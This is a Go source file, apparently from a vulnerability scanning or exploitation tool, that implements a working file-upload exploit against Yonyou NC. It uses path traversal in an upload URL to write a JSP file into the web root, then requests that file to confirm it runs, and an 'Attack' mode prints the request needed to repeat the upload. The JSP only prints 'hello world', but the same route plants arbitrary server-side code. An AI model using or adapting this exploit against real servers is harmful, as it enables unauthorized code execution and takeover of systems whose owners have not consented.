package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func YongYouNCFileUpload(url string, Attack bool) error {
	randomNumber := generateRandomNumber()
	randomString := strconv.Itoa(randomNumber)

	payload := fmt.Sprintf(`--d0b7a0d40eed0e32904c8017b09eb305
Content-Disposition: form-data; name="file"; filename="test%s.jsp" 
Content-Type: text/plain

<%%out.print("hello world");%%>
--d0b7a0d40eed0e32904c8017b09eb305--
`, randomString)
	payload = strings.ReplaceAll(payload, "\n", "\r\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%%5C..%%5C..%%5C..%%5C..%%5C..%%5C..%%5C..%%5C..%%5C..%%5Cwebapps%%5Cnc_web%%5C", url)
	//fmt.Println("test")
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	request.Header.Add("Content-Type", "multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))
	if err != nil {
		return err
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}

	defer response.Body.Close()

	url2 := fmt.Sprintf("%s/test%s.jsp", url, randomString)
	//fmt.Println("test")
	request2, err := http.NewRequest("GET", url2, nil)
	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	defer response2.Body.Close()

	if response.StatusCode == http.StatusOK && response2.StatusCode == http.StatusOK && strings.Contains(string(body2), "hello world") {
		fmt.Println("[*]YongYouNCFileUpload : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + fmt.Sprintf("请使用POST方法在%s下传入请求体数据：`--d0b7a0d40eed0e32904c8017b09eb305\nContent-Disposition: form-data; name=\"file\"; filename=\"test%s.jsp\" \nContent-Type: text/plain\n\n<%%out.print(\"hello world\");%%>\n--d0b7a0d40eed0e32904c8017b09eb305--`\n", url1))
		}
	}

	return nil
}
